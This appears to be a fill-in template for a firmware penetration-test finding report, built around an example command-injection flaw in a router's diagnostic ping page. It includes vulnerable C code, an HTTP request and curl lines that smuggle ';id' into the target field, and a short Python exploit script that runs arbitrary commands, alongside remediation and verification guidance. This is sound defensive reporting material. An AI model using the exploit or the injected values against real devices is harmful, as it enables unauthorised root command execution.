# Finding Template

> Template: example findings, scores and evidence below are illustrative. Replace
> them with verified assessment data and remove unused sections before delivery.


## FW-[ID]: [Vulnerability Title]

**Severity:** [Critical/High/Medium/Low/Informational]  
**CVSS v3.1 Score:** [SCORE] ([RATING])  
**CVSS Vector:** CVSS:3.1/AV:[N/A/L/P]/AC:[L/H]/PR:[N/L/H]/UI:[N/R]/S:[U/C]/C:[N/L/H]/I:[N/L/H]/A:[N/L/H]

**Category:** [CWE-XXX: Category Name]  
**Affected Component:** [Component/Service/Binary Name]  
**Location:** [File path / Function / Address]  
**Discovery Method:** [Static Analysis / Dynamic Analysis / Fuzzing / Manual Testing]

---

### Description

[1-2 paragraph technical description of the vulnerability. Include what is vulnerable, why it's vulnerable, and the technical mechanism.]

Example:
"The firmware's web administration interface contains an unauthenticated command injection vulnerability in the diagnostic ping functionality. The application fails to sanitize user-supplied IP addresses before passing them to a shell command, allowing arbitrary command execution with root privileges."

---

### Impact

An attacker exploiting this vulnerability can:

1. **[Primary Impact]** - [Description]
2. **[Secondary Impact]** - [Description]
3. **[Tertiary Impact]** - [Description]

**Business Impact:**
- [Data breach potential]
- [Service disruption]
- [Compliance violations]
- [Reputation damage]

**Technical Impact:**
- Confidentiality: [None / Low / Medium / High]
- Integrity: [None / Low / Medium / High]
- Availability: [None / Low / Medium / High]

---

### Technical Details

#### Vulnerable Code

**File:** `/path/to/vulnerable/file`  
**Function:** `function_name`  
**Address:** `0x[HEX_ADDRESS]` (if applicable)

**Vulnerable Code Snippet:**
```c
// Language: C / Python / Shell / etc.
[Paste vulnerable code here]

// Example:
char command[256];
sprintf(command, "ping -c 4 %s", user_input);  // VULNERABLE
system(command);
```

**Decompiled Code (if from RE):**
```c
[Paste Ghidra decompiled code]
```

#### Root Cause Analysis

[Explain WHY the vulnerability exists]

- **Missing:** [Input validation / Bounds checking / Authentication / etc.]
- **Weak:** [Encryption / Hashing / Randomization / etc.]
- **Improper:** [Resource management / Error handling / etc.]

#### Attack Prerequisites

- **Network Access:** [Required / Not Required]
- **Authentication:** [Required / Not Required]
- **User Interaction:** [Required / Not Required]
- **Privileges Required:** [None / Low / High]
- **Attack Complexity:** [Low / High]

---

### Proof of Concept

#### Exploitation Steps

1. **[Step 1]** - [Action]
   ```bash
   [Command or code]
   ```

2. **[Step 2]** - [Action]
   ```bash
   [Command or code]
   ```

3. **[Step 3]** - [Verify exploitation]
   ```bash
   [Command or code]
   ```

#### Example Attack

**Attack Vector:**
```http
[HTTP request / Network packet / Command]

Example:
POST /cgi-bin/diagnostic.cgi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded

target=127.0.0.1;id
```

**Expected Response:**
```
uid=0(root) gid=0(root) groups=0(root)
```

#### Exploit Code

```python
#!/usr/bin/env python3
"""
Exploit for FW-[ID]: [Title]
Author: [Your Name]
Target: [Product] firmware [Version]
"""

import requests
import sys

def exploit(target_ip, command):
    """
    Exploits command injection to execute arbitrary commands
    """
    url = f"http://{target_ip}/cgi-bin/diagnostic.cgi"
    
    payload = {
        'target': f'127.0.0.1;{command}'
    }
    
    try:
        r = requests.post(url, data=payload, timeout=5)
        print(f"[+] Command executed successfully")
        print(f"[+] Response: {r.text}")
        return True
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <command>")
        sys.exit(1)
    
    target = sys.argv[1]
    cmd = sys.argv[2]
    
    exploit(target, cmd)
```

---

### Evidence

**Screenshots:**
- `evidence/fw-[ID]-vuln-location.png` - Source of vulnerability
- `evidence/fw-[ID]-exploitation.png` - Successful exploitation
- `evidence/fw-[ID]-impact.png` - Demonstration of impact

**Packet Captures:**
- `evidence/fw-[ID]-traffic.pcap` - Network traffic during exploitation

**Logs:**
- `evidence/fw-[ID]-system-logs.txt` - System logs showing exploitation

**Video:**
- `evidence/fw-[ID]-demo.mp4` - Video demonstration (if applicable)

---

### Remediation

#### Immediate Actions (Emergency Patch)

1. **[Action 1]** - [Description]
   - Disable affected functionality
   - Apply input filtering workaround
   
2. **[Action 2]** - [Description]
   - Implement temporary access controls
   - Enable additional logging

#### Permanent Fix

**Recommended Solution:**

```c
// BEFORE (Vulnerable):
sprintf(command, "ping -c 4 %s", user_input);
system(command);

// AFTER (illustrative; run in a child with verified UID/GID and validated input):
// 1. Validate input
if (!is_valid_ip_address(user_input)) {
    return ERROR_INVALID_INPUT;
}

// 2. In a privileged child, drop supplementary groups, GID and UID BEFORE exec.
// Include <grp.h> and <unistd.h>; use verified non-root target IDs.
if (setgroups(0, NULL) != 0 || setgid(UNPRIVILEGED_GROUP_ID) != 0 ||
    setuid(UNPRIVILEGED_USER_ID) != 0) {
    return ERROR_PRIVILEGE_DROP;
}
// 3. Invoke directly without a shell; do not continue privileged on failure.
char *args[] = {"/bin/ping", "-c", "4", user_input, NULL};
execv("/bin/ping", args);
return ERROR_EXEC;  // Successful execv does not return.
```

**Code Changes Required:**

**File:** `/path/to/file`
**Lines:** [START-END]

```diff
- sprintf(command, "ping -c 4 %s", user_input);
- system(command);
+ if (!is_valid_ip_address(user_input)) {
+     return ERROR_INVALID_INPUT;
+ }
+ char *args[] = {"/bin/ping", "-c", "4", user_input, NULL};
+ execv("/bin/ping", args);
```

#### Defense in Depth

Additional security measures:

1. **Input Validation:**
   - Whitelist allowed characters
   - Validate format (IP address, domain, etc.)
   - Reject special characters: `;|&$(){}[]<>`

2. **Least Privilege:**
   - Run web server as unprivileged user
   - Use capabilities instead of root
   - Implement SELinux/AppArmor policies

3. **Monitoring:**
   - Log all diagnostic command executions
   - Alert on suspicious patterns
   - Implement rate limiting

4. **Network Segmentation:**
   - Isolate admin interface on separate VLAN
   - Require VPN for management access

---

### Verification

#### Testing After Remediation

1. **Functional Test:**
   ```bash
   # Test legitimate functionality still works
   curl -X POST http://device/cgi-bin/diagnostic.cgi -d "target=8.8.8.8"
   # Should work and return ping results
   ```

2. **Security Test:**
   ```bash
   # Attempt exploitation
   curl -X POST http://device/cgi-bin/diagnostic.cgi -d "target=8.8.8.8;id"
   # Should reject or sanitize input
   ```

3. **Regression Test:**
   - Verify existing functionality unaffected
   - Test edge cases
   - Performance testing

#### Success Criteria

Input validation rejects all malicious payloads
Commands execute without shell interpretation
Privileges dropped before command execution
Logging implemented for security events
No regression in legitimate functionality

---

### References

- **CWE:** [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- **OWASP:** [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- **CAPEC:** [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- **CVE:** [CVE-YYYY-XXXXX] (if applicable)

---

### Timeline

- **Discovered:** [DATE]
- **Reported:** [DATE]
- **Acknowledged:** [DATE]
- **Fixed:** [DATE] (if applicable)
- **Verified:** [DATE] (if applicable)

---

**Finding ID:** FW-[ID]  
**Analyst:** [NAME]  
**Date:** [DATE]  
**Status:** [Open / In Progress / Fixed / Verified]
